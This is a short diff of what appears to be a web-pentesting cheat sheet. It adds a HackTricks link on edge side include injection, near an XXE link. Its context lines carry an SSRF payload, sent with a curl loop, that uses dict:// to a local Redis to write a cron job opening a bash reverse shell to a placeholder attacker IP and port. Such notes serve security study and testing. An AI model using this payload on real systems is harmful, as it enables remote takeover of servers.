@@ -342,6 +342,10 @@ for i in {1..10000}; do curl -s -i http://site.org/index.php --data "url=http://
 dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port> 0>\x261\n\n\n"
 ```
 
+### Edge side include
+
+- https://book.hacktricks.wiki/en/pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html
+
 ## XXE
   - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
  
